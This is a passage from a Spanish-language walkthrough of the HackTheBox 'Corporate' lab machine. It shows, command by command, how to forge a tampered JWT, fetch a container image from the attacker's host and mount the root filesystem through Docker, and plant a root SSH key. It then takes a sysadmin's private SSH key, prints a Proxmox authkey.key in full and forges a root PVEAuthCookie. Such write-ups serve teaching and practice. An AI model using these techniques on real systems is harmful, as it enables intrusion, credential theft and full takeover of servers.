OjE3MjA0NzE2NzcsImV4cCI6MTczMTIwMzM1Nn0.pMCfdUY-Z2_9DPmLR3nQ0kTlUFwKmLRrut
vJ9NiwxGE
... [snip]
Token header values:
[1] alg = "HS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] id = 5072
[2] name = "Candido"
[3] surname = "Hackett"
[4] email = "Candido.Hackett@corporate.htb"
[5] roles = ['sales']
[6] requireCurrentPassword = True
[7] iat = 1720471677    ==> TIMESTAMP = 2024-07-08 16:47:57 (UTC)
[8] exp = 1731203356    ==> TIMESTAMP = 2024-11-09 21:49:16 (UTC)
[9] *ADD A VALUE*
[10] *DELETE A VALUE*
[11] *UPDATE TIMESTAMPS*
[0] Continue to next step
Please select a field number:
(or 0 to Continue)
> 2

Current value of name is: Candido
Please enter new value and hit ENTER
> Gayle
... [snip]
Please select a field number:
(or 0 to Continue)
> 3

Current value of surname is: Hackett
Please enter new value and hit ENTER
> Graham
... [snip]

Please select a field number:
(or 0 to Continue)
> 6

Current value of requireCurrentPassword is: True
Please enter new value and hit ENTER
> False

# El ID lo cambié simplemente por conveniencia
[1] id = 5025
[2] name = "Gayle"
[3] surname = "Graham"
[4] email = "Candido.Hackett@corporate.htb"
[5] roles = ['sales']
[6] requireCurrentPassword = False
[7] iat = 1720471677    ==> TIMESTAMP = 2024-07-08 16:47:57 (UTC)
[8] exp = 1731203356    ==> TIMESTAMP = 2024-11-09 21:49:16 (UTC)
[9] *ADD A VALUE*
[10] *DELETE A VALUE*
[11] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_7be519bf31213abef2d6723cc0402148 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTAyNSwibmFtZSI6IkdheWxlI
iwic3VybmFtZSI6IkdyYWhhbSIsImVtYWlsIjoiQ2FuZGlkby5IYWNrZXR0QGNvcnBvcmF0ZS5
odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjpmYWxzZSwia
WF0IjoxNzIwNDcxNjc3LCJleHAiOjE3MzEyMDMzNTZ9.Ghms8OJ38zt4HrYZnB0bQ4qXpQOUFl
Pkns9vVIxnRgc

```

Al colocarnos este token en nuestro navegador y posteriormente cambiar la contraseña a nuestro gusto, tendremos acceso como alguien del grupo ingeniero:

```bash
elwin.jones@corporate-workstation-04:~$ su gayle.graham
Password: 
gayle.graham@corporate-workstation-04:/home/guests/elwin.jones$
```

Ahora simplemente podemos obtener una imagen de Docker como puede bien puede ser la de Alpine, subirla y crear un contenedor que tenga toda la raiz de la workstation montada:

```bash
gayle.graham@corporate-workstation-04:~$ curl -o alpine.tar.gz http://10.
10.14.219:8000/alpine.tar.gz
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current Dload  Upload   Total   Spent    Left  Speed
100 3208k  100 3208k    0     0  38584      0  0:01:25  0:01:25 --:--:-- 
 126k
gayle.graham@corporate-workstation-04:~$ docker image import alpine.tar.gz alpine
sha256:88fcc96b0fc26606cb54849b751f11baf6513b66661d20787698c497b4b2e361
gayle.graham@corporate-workstation-04:~$ docker run -v '/:/mnt' -it alpine ash
/ # cd /mnt
/mnt # ls
bin         home        libx32      opt         sbin        tmp
boot        lib         lost+found  proc        snap        usr
dev         lib32       media       root        srv         var
etc         lib64       mnt         run         sys
```

> Tuve que usar el rootfs de https://github.com/alpinelinux/docker-alpine/raw/97c57449282d97cfa1c0b64669aed9afbf08645a/x86_64/alpine-minirootfs-3.19.0-x86_64.tar.gz ya que la imagen oficial más reciente que descargaba y exportaba desde mi docker por algún motivo no funcionaba acá
{: .prompt-info }

El directorio `/home/` se ve muy vacio además de que el usuario sysadmin no parece tener nada interesante 

```bash
/mnt/home # ls -la
total 12
drwxr-xr-x    4 root     root          4096 Apr 18  2023 .
drwxr-xr-x   19 root     root          4096 Nov 27  2023 ..
drwxr-xr-x    3 root     root             0 Jul  9 23:49 guests
drwxr-x---    5 1000     1000          4096 Nov 28  2023 sysadmin
```

Sin embargo, ¿recuerdas que antes vimos que estaba el puerto NFS abierto en la máquina host?, pues parece que este directorio de home es una montura del directorio home ubicado en el equipo host en cuestión:

```bash
/mnt/home/sysadmin # mount
... [snip]
/etc/auto.home on /mnt/home/guests type autofs (rw,relatime,fd=7,pgrp=0,t
imeout=300,minproto=5,maxproto=5,indirect,pipe_ino=24084)
corporate.htb:/home/guests/gayle.graham on /mnt/home/guests/gayle.graham 
type nfs4 (rw,relatime,vers=4.2,rsize=524288,wsize=524288,namlen=255,hard
,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.9.0.4,local_lock=non
e,addr=10.9.0.1)
... [snip]
```

Hay un software que se encarga de montar automáticamente el directorio home del usuario que se conecta a la workstation en cuestión, pero solo está montando el directorio del usuario que se conecta, ¿qué pasaria si en vez de, montamos todo el directorio de `guests`?

Vamos a colocarle una llave ssh autorizada al usuario root para acceder como este:

```bash
/mnt/root/.ssh # echo 'ssh-rsa AAAAB3NzaC1yc2EAA... [snip]' > authorized_keys
```

```bash
❯ ssh -i root.key root@10.9.0.4
root@corporate-workstation-04:~#
```

Ahora, montemos el directorio nfs en cuestión a `/mnt`

```bash
root@corporate-workstation-04:/# mount -t nfs corporate.htb:/home/guests /mnt
root@corporate-workstation-04:/# cd /mnt
root@corporate-workstation-04:/mnt# ls
abbigail.halvorson  erna.lindgren         mabel.koepp
abigayle.kessler    esperanza.kihn        marcella.kihn
adrianna.stehr      estelle.padberg       margarette.baumbach
ally.effertz        estrella.wisoky       marge.frami
america.kirlin      garland.denesik       michale.jakubowski
amie.torphy         gayle.graham          mohammed.feeney
anastasia.nader     gideon.daugherty      morris.lowe
annamarie.flatley   halle.keeling         nora.brekke
antwan.bernhard     harley.ratke          nya.little
arch.ryan           hector.king           oleta.gutmann
august.gottlieb     hermina.leuschke      penelope.mcclure
bethel.hessel       jacey.bernhard        rachelle.langworth
beth.feest          jammie.corkery        raphael.adams
brody.wiza          josephine.hermann     richie.cormier
callie.goldner      joy.gorczany          rosalee.schmitt
candido.hackett     julio.daniel          ross.leffler
candido.mcdermott   justyn.beahan         sadie.greenfelder
cathryn.weissnat    kacey.krajcik         scarlett.herzog
cecelia.west        kasey.walsh           skye.will
christian.spencer   katelin.keeling       stephen.schamberger
dangelo.koch        katelyn.swift         stevie.rosenbaum
dayne.ruecker       kian.rodriguez        tanner.kuvalis
dessie.wolf         larissa.wilkinson     uriel.hahn
dylan.schumm        laurie.casper         veda.kemmer
elwin.jones         leanne.runolfsdottir  ward.pfannerstill
elwin.mills         lila.mcglynn          zaria.kozey
```
> También puedes simplemente convertirte en uno de estos usuarios utilizando `su` ya que eres root, e igual necesitarás hacerlo para poder ver sus directorios ya que están protegidos por el NFS.
{: .prompt-tip }

Son los directorios personales de todos los usuarios, vaya... viendo que tienen los del grupo sysadmin, especificamente Stevie Rosenbaum en su directorio nos encontramos con una llave SSH privada y parece que es para el equipo principal (`10.8.0.1`)

```bash
root@corporate-workstation-04:/mnt# su stevie.rosenbaum
stevie.rosenbaum@corporate-workstation-04:/mnt$ cd stevie.rosenbaum/
stevie.rosenbaum@corporate-workstation-04:/mnt/stevie.rosenbaum$ ls -la
total 36
drwxr-x---  5 stevie.rosenbaum stevie.rosenbaum 4096 Nov 27  2023 .
drwxr-xr-x 80 root             root             4096 Apr  8  2023 ..
lrwxrwxrwx  1 root             root                9 Nov 27  2023 .bash_history -> /dev/null
-rw-r--r--  1 stevie.rosenbaum stevie.rosenbaum  220 Apr 13  2023 .bash_logout
-rw-r--r--  1 stevie.rosenbaum stevie.rosenbaum 3526 Apr 13  2023 .bashrc
drwx------  2 stevie.rosenbaum stevie.rosenbaum 4096 Apr 13  2023 .cache
drwxrwxr-x  3 stevie.rosenbaum stevie.rosenbaum 4096 Apr 13  2023 .local
-rw-r--r--  1 stevie.rosenbaum stevie.rosenbaum  807 Apr 13  2023 .profile
drwx------  2 stevie.rosenbaum stevie.rosenbaum 4096 Apr 13  2023 .ssh
-rw-r--r-- 79 root             sysadmin           33 Jul  9 10:06 user.txt
stevie.rosenbaum@corporate-workstation-04:/mnt/stevie.rosenbaum$ cd .ssh
stevie.rosenbaum@corporate-workstation-04:/mnt/stevie.rosenbaum/.ssh$ ls
config  id_rsa  id_rsa.pub  known_hosts  known_hosts.old
stevie.rosenbaum@corporate-workstation-04:/mnt/stevie.rosenbaum/.ssh$ cat config
Host mainserver
    HostName corporate.htb
    User sysadmin
```

Intentando usarla en el host que nos indican, nos permite el acceso y por ende hemos pivotado al equipo principal.

```bash
❯ /usr/bin/ssh -i sysadmin.key sysadmin@10.8.0.1
Linux corporate 5.15.131-1-pve #1 SMP PVE 5.15.131-2 (2023-11-14T11:32Z) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Dec 27 09:50:05 2023 from 10.8.0.3
sysadmin@corporate:~$
```

### root - 10.9.0.1

En `/var/backups/` hay un fichero que llama la atención

```bash
sysadmin@corporate:/var/backups$ ls
alternatives.tar.0        dpkg.arch.2.gz          dpkg.status.0
apt.extended_states.0     dpkg.diversions.0       dpkg.status.1.gz
apt.extended_states.1.gz  dpkg.diversions.1.gz    dpkg.status.2.gz
apt.extended_states.2.gz  dpkg.diversions.2.gz    proxmox_backup_corporate_2023-04-15.15.36.28.tar.gz
apt.extended_states.3.gz  dpkg.statoverride.0     pve-host-2023_04_15-16_09_46.tar.gz
dpkg.arch.0               dpkg.statoverride.1.gz  slapd-2.4.57+dfsg-3+deb11u1
dpkg.arch.1.gz            dpkg.statoverride.2.gz  unknown-2.4.57+dfsg-3+deb11u1-20230407-203136.ldapdb
```

Parece que alguien hizo un backup de la carpeta del Proxmox y lo dejó en este lugar. Extrayendolo para ver que contiene vemos que hay otros comprimidos que parecen tener cosas interesantes:

```bash
sysadmin@corporate:/tmp/var/tmp/proxmox-OGXn58aE$ ls -lla
total 131592
drwxr-xr-x 2 sysadmin sysadmin      4096 Jul 10 12:37 .
drwxr-xr-x 3 sysadmin sysadmin      4096 Jul 10 12:37 ..
-rw-r--r-- 1 sysadmin sysadmin     10240 Apr 15  2023 proxmoxcron.2023-04-15.15.36.28.tar
-rw-r--r-- 1 sysadmin sysadmin   4935680 Apr 15  2023 proxmoxetc.2023-04-15.15.36.28.tar
-rw-r--r-- 1 sysadmin sysadmin 125542400 Apr 15  2023 proxmoxlocalbin.2023-04-15.15.36.28.tar
-rw-r--r-- 1 sysadmin sysadmin      8680 Apr 15  2023 proxmoxpackages.2023-04-15.15.36.28.list
-rw-r--r-- 1 sysadmin sysadmin   4198400 Apr 15  2023 proxmoxpve.2023-04-15.15.36.28.tar
-rw-r--r-- 1 sysadmin sysadmin     32603 Apr 15  2023 proxmoxreport.2023-04-15.15.36.28.txt
```

Veamos el comprimido `proxmoxetc.2023-04-15.15.36.28.tar`

```bash
sysadmin@corporate:/tmp/var/tmp/proxmox-OGXn58aE$ tar -xf proxmoxetc.2023-04-15.15.36.28.tar 
tar: Removing leading '/' from member names
sysadmin@corporate:/tmp/var/tmp/proxmox-OGXn58aE/etc$ ls -la
total 972
drwxr-xr-x 96 sysadmin sysadmin  4096 Apr 15  2023 .
drwxr-xr-x  3 sysadmin sysadmin  4096 Jul 10 12:44 ..
-rw-r--r--  1 sysadmin sysadmin  2981 Mar 22  2023 adduser.conf
-rw-r--r--  1 sysadmin sysadmin    73 Mar 22  2023 aliases
-rw-r--r--  1 sysadmin sysadmin 12288 Apr  7  2023 aliases.db
drwxr-xr-x  2 sysadmin sysadmin  4096 Apr 12  2023 alternatives
drwxr-xr-x  2 sysadmin sysadmin  4096 Apr  7  2023 apparmor
drwxr-xr-x  8 sysadmin sysadmin  4096 Apr  7  2023 apparmor.d
drwxr-xr-x  8 sysadmin sysadmin  4096 Apr  8  2023 apt
-rw-r--r--  1 sysadmin sysadmin  1994 Mar 27  2022 bash.bashrc
-rw-r--r--  1 sysadmin sysadmin    45 Jan 24  2020 bash_completion
... [snip]
```

Parece que tenemos toda la carpeta `/etc/` acá y con permisos de nuestro usuario, por lo que podemos leer cosas como el `app.ini` del Gitea

```bash
sysadmin@corporate:/tmp/var/tmp/proxmox-OGXn58aE/etc$ cd gitea
sysadmin@corporate:/tmp/var/tmp/proxmox-OGXn58aE/etc/gitea$ ls -la
total 12
drwxr-x---  2 sysadmin sysadmin 4096 Apr 12  2023 .
drwxr-xr-x 96 sysadmin sysadmin 4096 Apr 15  2023 ..
-rw-r--r--  1 sysadmin sysadmin 1710 Apr 12  2023 app.ini
```

Sin embargo esto no es de nuestro interés, ya que lo queremos hacer es escalar privilegios; pero del resto no parece haber más nada y la carpeta del Proxmox (pve) está vacia, por lo que acá no hay nada que nos pueda servir.

Del otro lado, el comprimido `proxmoxpve.2023-04-15.15.36.28.tar` parece tener una base de datos SQLite con información...

```bash
sysadmin@corporate:/tmp/var/tmp/proxmox-OGXn58aE/var/lib/pve-cluster$ sqlite3 config.db
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .schema
CREATE TABLE tree (  inode INTEGER PRIMARY KEY NOT NULL,  parent INTEGER NOT NULL CHECK(typeof(parent)=='integer'),  version INTEGER NOT NULL CHECK(
typeof(version)=='integer'),  writer INTEGER NOT NULL CHECK(typeof(writer)=='integer'),  mtime INTEGER NOT NULL CHECK(typeof(mtime)=='integer'),  ty
pe INTEGER NOT NULL CHECK(typeof(type)=='integer'),  name TEXT NOT NULL,  data BLOB);
sqlite> select name from tree;
__version__
storage.cfg
user.cfg
datacenter.cfg
virtual-guest
priv
... [snip]
```

y hay una fila en esta tabla con un dato interesante

```bash
sqlite> select data from tree where name="authkey.key";
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4qucBTokukm1jZuslN5hZKn/OEZ0Qm1hk+2OYe6WtjXpSQtG
EY8mQZiWNp02UrVLOBhCOdW/PDM0O2aGZmlRbdN0QVC6dxGgE4lQD9qNKhFqHgdR
Q0kExxMa8AiFNJQOd3XbLwE5cEcDHU3TC7er8Ea6VkswjGpxn9LhxuKnjAm81M4C
frIcePe9zp7auYIVVOu0kNplXQV9T1l+h0nY/Ruch/g7j9sORzCcJpKviJbHGE7v
OXxqKcxEOWntJmHZ8tVb4HC4r3xzhA06IRj3q/VrEj3H6+wa6iEfYJgp5flHtVA8
8TlXitfsBH+ZT41CH3/a6JudMYSLGKvatGgjJQIDAQABAoIBAQCBBoBcNVmctMJk
ph2Z6+/ydhXyOaCKA2tM4idvNXmSpKNzUbiD3EFBi5LN6bV3ZP05JA3mj/Y4VUlB
Gr4cY4zXgEsntsU9a8n79Oie7Z/3N0x5ZV7rdxACJazqv17bq/+EHpEyc3b3o2Rx
dNBSVi3IKup8nnY3J4wgFtEv/eqzefDc4ODcDIz/j46eh/TZLll7zhesJ6Icfml3
aZ3GjWdQWOwlj1rDCP7S/ehryNbB7p2T/FVHw6tbMf7XYtjlWzQbns+m9sQmrD3Q
Lmw9zk7NyCuZi0/l8XiaJINv4VWFUuU4/KrifW7az81AAVcNLSKkg2AQ9Q3VSdyH
z1p5Hz8tAoGBAP5wTIwhG781oHR3vu15OnoII9DFm80CtmeqA5mL2LzHB5Po2Osn
wkspMpKioukFWcnwZO9330h/FSyv6zYJP/5QfwTkskEsYli6emdwJgb0C+HJYVVx
/CWeDNvLhyNam0HcqzXMFzQhLfGaKoq4FZ95ozNOCv1K83G379o7VsRPAoGBAOQP
sFdEEgDB/t0lnOEFfRSTwtJ2/IlLwBLMlm09aIwB7DqI9dl8fIcq8YR03XhGzIg0
H28xf3b5Ql619VJ9YESRSq+F4VjuMzJpXJuHshR9wQZy8RDEtr43OwTBOG7sUNKi
I0MBFxEmfaPeZCIZCLouam1JBNAA3YwFxlPm8WBLAoGAXOmtSk6cz0pJ+b3wns9y
JzXpvkcrCcY/zcMr5VpIH0ee4MhaziSKst+sdBen3efyTefXNAtWIicmGFd1URo3
oCrM94B8B4ipsTUHldZCTK+51w2u2YDyTtpUX78G7kYcBAUNEGwi3QpwuJVPi7CF
VOMaUZXiNXS1SYWdtNeOa8kCgYA60g0SRN070s0wLo5Kv0amcwHRlJzHsIDmmFvH
6wm26pwJ8N8v69qWZi4KkrW4WtJP4tmkrSiJ//ntQZL3ZpzYsnyHzsjzTeRogSJA
fvwgKtsJFcY1I/daEhanwEoU2eByoxzjIDnZ04qeJDLBVKGam3QZobabC04Y2jhv
1WW2BwKBgCD/j2QWr62kh48MY5hCG94YrZRiH1+WdJul+HpTXGax0kB8bXXehh7N
n4+xaiJCTUElVEm2KH/7C8yKoytm8HR7eRrq7SJSbWEmvI/1Yhj1A9g2/vrCxOlm
GtYXpgsbUgcGgg3Hr9/piitsBlSME6niawdxaMT9eLyLNUAnHRec
-----END RSA PRIVATE KEY-----
```

Si buscamos información sobre el fichero `authkey.key` en internet, nos aparecerá que con esta llave se firman las cookies con las que se accede a la consola web de Proxmox, lo que significa que, similar a lo que hicimos con el JWT, si esta llave se está usando actualmente podemos autenticarnos como quien queramos, en este caso iremos por root ya que parece ser el único usuario existente en la consola.

Buscando por internet como se firman estas cookies o directamente viendo el código Perl del backend de la consola en cuestión encontraremos que las cookies se firman utilizando SHA-1 y que el formato de estas es como sigue:

`PVE:<username>@<auth mechanism/realm>:<timestamp in hex>::<base64 signature of the previous>`

Lo primero podemos crearlo fácilmente:

`PVE:root@pam:668E795E`

Ahora solo tenemos que crear una firma SHA-1 codificada en base64 de este string utilizando la llave privada, usaré OpenSSL para esto:

```bash
❯ echo -n 'PVE:root@pam:668E795E' | openssl sha1 -sign proxmox_auth.key  | base64 -w 0
gBbukEUxkTCBgMgz+nEEr0B1YJiZKI5bPEv5TuylW100vPIEnR6Lj/gN6ThuHFRBcbcdDDWYdIZzysF1/Kichy95/+5zgVtc9zA7xST4CVJL7LwZKzvjmNYdnN4IXdmTESLtxKHP5ZAfliq43nK7A1nmr4N2LV8Jf0bvOiUr06IfJuIYY9A2KyWOGljt0fywA4bJFBPJ5huneQmvi6rOvEVwG2fUbqdUXhqU5EnMV9Xdu7K7S070axO1Hwr5t9g02ZyL6O/E0FiR2pKObWZiKlpCfkT7VO3COdjMqU9WxXRl/5Lz/pXuDQolla6JlLaFBaEsKXSI+nlwOy6C5fO+3Q==
```

Por lo que la cookie final seria entonces

`PVE:root@pam:668E795E::gBbukEUxkTCBgMgz+nEEr0B1YJiZKI5bPEv5TuylW100vPIEnR6Lj/gN6ThuHFRBcbcdDDWYdIZzysF1/Kichy95/+5zgVtc9zA7xST4CVJL7LwZKzvjmNYdnN4IXdmTESLtxKHP5ZAfliq43nK7A1nmr4N2LV8Jf0bvOiUr06IfJuIYY9A2KyWOGljt0fywA4bJFBPJ5huneQmvi6rOvEVwG2fUbqdUXhqU5EnMV9Xdu7K7S070axO1Hwr5t9g02ZyL6O/E0FiR2pKObWZiKlpCfkT7VO3COdjMqU9WxXRl/5Lz/pXuDQolla6JlLaFBaEsKXSI+nlwOy6C5fO+3Q==`

Colocandola en nuestro navegador como `PVEAuthCookie`, nos da el acceso a la consola del Proxmox:

![Proxmox 2](/assets/writeups/corporate/21.png)

Por lo que ahora simplemente podemos irnos a la sección del nodo corporate, en la parte de `Shell` para tener una consola interactiva como root en `10.8.0.1` y tomar la última flag.

![Root](/assets/writeups/corporate/22.png)

## Extra

Personalmente, esta ha sido una de las mejores máquinas que he realizado en la plataforma de HackTheBox. Realmente me hizo sentir como si estuviera vulnerando un entorno corporativo real, además de que me excita bastante pivotar entre usuarios y equipos.

En sus días del estreno, cuando la resolví hize un diagrama de como estaba estructurada la máquina más o menos, está un poco feo pero aquí lo dejo por si te es de interés:

![Diagram](/assets/writeups/corporate/extra.webp)

y como dato adicional, hablando sobre lo de Bitwarden [alguien hizo](https://github.com/JorianWoltjer/bitwarden-pin-bruteforce) una implementación más sencilla del cracking de pins unos meses después del release de esta máquina. Me imagino que para facilitar esta tarea.